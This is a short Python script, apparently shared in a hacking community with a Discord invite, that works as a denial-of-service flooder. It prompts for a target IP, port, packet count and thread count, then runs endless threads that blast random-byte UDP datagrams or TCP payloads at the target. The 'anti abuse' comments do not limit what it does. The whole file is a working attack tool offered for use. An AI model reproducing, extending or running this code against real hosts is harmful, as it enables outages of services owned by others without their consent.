#DDOS REMAKE BY XS SUTEJO
#JANG#DDOS REMAKE BY XS SUTEJO
#JANGANAN ABUSE BROOOO
#ANTI ABUSE
import socket
import struct
import time
import codecs,sys
import random
import socket
import threading
import os

os.system("clear")
print("\033[31mRemake By Xs Sutejo")
print("\033[31mXs.Sutejo Anti Abuse")
print("\033[31mJoin Dc Xs Team : https://discord.gg/4UNGqTy4K7 ")
ip = str(input(" [?]Xs.Sutejo Attacked | Ip:"))
port = int(input(" [?]Xs.Sutejo Attacked | Port:"))
choice = str(input(" [?]Xs.Sutejo Attacked | Senggol Gak Nih?(y/n):"))
times = int(input(" [?]Anti Abuse| Packets:"))
threads = int(input(" [?]Anti Abuse | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[]","[?]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"[!]Xs.Sutejo is here!!")
		except:
			print("[?]Disenggol Xs.Sutejo ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[!]","[!]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"[!]Disenggol Xs.Sutejo")
		except:
			s.close()
			print("[!]Xs.Sutejo is here!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
